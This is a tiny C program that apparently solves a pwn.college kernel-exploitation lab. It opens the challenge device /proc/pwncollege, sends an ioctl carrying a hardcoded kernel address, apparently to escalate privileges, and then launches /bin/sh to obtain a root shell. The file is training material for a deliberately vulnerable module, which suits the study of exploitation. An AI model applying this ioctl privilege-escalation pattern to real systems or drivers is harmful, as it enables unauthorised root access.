#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

int main() {
  int fd = open("/proc/pwncollege", O_RDWR);

  ioctl(fd, 0x539, 0xffffffffc0000bc2);
  execl("/bin/sh", "/bin/sh", 0);

  return 0;
}
